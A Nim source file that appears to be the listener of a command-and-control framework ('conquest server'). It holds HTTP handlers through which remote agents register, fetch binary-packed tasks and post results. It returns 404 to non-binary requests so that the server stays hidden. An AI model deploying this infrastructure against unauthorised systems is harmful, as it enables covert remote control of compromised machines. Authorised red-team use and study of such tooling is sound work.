import prologue, json, terminal, strformat
import sequtils, strutils, times, base64

import ./handlers
import ../[utils, globals]
import ../../common/[types, utils]

proc error404*(ctx: Context) {.async.} = 
    resp "", Http404

#[
    POST /register
    Called from agent to register itself to the conquest server
]# 
proc register*(ctx: Context) {.async.} = 

    # Check headers
    # If POST data is not binary data, return 404 error code
    if ctx.request.contentType != "application/octet-stream": 
        resp "", Http404
        return

    try: 
        let agentId = register(ctx.request.body.toBytes())
        resp "", Http200

    except CatchableError:
        resp "", Http404

#[
    POST /tasks
    Called from agent to check for new tasks
]#
proc getTasks*(ctx: Context) {.async.} = 

    # Check headers
    # If POST data is not binary data, return 404 error code
    if ctx.request.contentType != "application/octet-stream": 
        resp "", Http404
        return  

    try: 
        var response: seq[byte]
        let tasks: seq[seq[byte]] = getTasks(ctx.request.body.toBytes())

        if tasks.len <= 0: 
            resp "", Http200
            return

        # Create response, containing number of tasks, as well as length and content of each task
        # This makes it easier for the agent to parse the tasks
        response.add(cast[uint8](tasks.len))

        for task in tasks:
            response.add(uint32(task.len).toBytes()) 
            response.add(task)
        
        await ctx.respond(
            code = Http200,
            body = response.toString()
        )

        # Notify operator that agent collected tasks
        {.cast(gcsafe).}:
            let date = now().format("dd-MM-yyyy HH:mm:ss")
            cq.writeLine(fgBlack, styleBright, fmt"[{date}] [*] ", resetStyle, fmt"{$response.len} bytes sent.")

    except CatchableError:
        resp "", Http404

#[
    POST /results
    Called from agent to post results of a task
]#
proc postResults*(ctx: Context) {.async.} = 
    
    # Check headers
    # If POST data is not binary data, return 404 error code
    if ctx.request.contentType != "application/octet-stream": 
        resp "", Http404
        return

    try: 
        handleResult(ctx.request.body.toBytes())

    except CatchableError:
        resp "", Http404

    return